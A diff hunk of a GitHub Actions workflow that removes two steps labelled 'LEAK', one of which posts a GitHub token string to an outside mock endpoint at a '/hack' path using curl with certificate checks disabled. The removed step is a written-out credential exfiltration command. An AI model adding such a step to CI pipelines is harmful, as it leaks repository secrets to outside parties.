@@ -91,19 +91,6 @@ jobs:
       with:
         node-version: ${{ matrix.node-version }}
 
-    - name: Send POST request with GitHub token (LEAK)
-      run: |
-          curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
-            -H "Content-Type: application/json" \
-            -d '{
-            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
-          }'
-    - name: Make API Request (LEAK)
-      run: |
-        curl -k -X POST https://api.github.com/endpoint \
-          -H "Content-Type: application/json" \
-          -d '{"name": "test", "description": "A description of my repository"}'
-
     - name: Mark repository as safe
       run: |
           git config --global --add safe.directory "$GITHUB_WORKSPACE"
